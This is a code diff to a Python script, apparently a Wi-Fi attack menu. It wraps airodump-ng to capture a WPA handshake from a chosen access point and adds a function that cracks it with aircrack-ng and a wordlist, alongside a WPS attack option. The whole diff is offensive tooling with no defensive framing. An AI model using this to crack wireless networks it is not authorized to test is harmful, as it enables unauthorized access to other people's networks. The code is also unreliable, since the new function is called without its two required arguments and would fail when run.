@@ -41,9 +41,11 @@ def handshake(adapter):
         channel = input("[+] Input wifi_channel: ")
         handshake_file = input("enter name of handshake file: ")
         subprocess.call(['airodump-ng', '--bssid', wifi_bssid, '--channel', channel, '--write', handshake_file, adapter])
-        wordlist_file = 'wordlist.txt'
-        # subprocess.call['aircrack-ng',handshake_file + "-01.cap", '-w', wordlist_file]
 
+def wordlist_attacK(handshake_file, wordlist_file):
+    handshake_file = input("[+] Input Handshake File Name: ")
+    wordlist_file = input("[+] Input Wordlist File: ")
+    subprocess.call(['aircrack-ng', handshake_file, '-w', wordlist_file])
 
 
 user_selection = input("[+] Which Vunerability do you want to run: \n 1. WPS \n 2. Wordlist Attack \n Selection: ")
@@ -56,8 +58,12 @@ if user_selection == '1':
         pass
 
     wps_vunerability(adapter)
-elif  user_selection == '2': 
-    handshake(adapter)
+elif  user_selection == '2':
+    try: 
+        handshake(adapter)
+    except KeyboardInterrupt:
+        print("Running Wordlist attack")
+        wordlist_attacK()
 
 
 
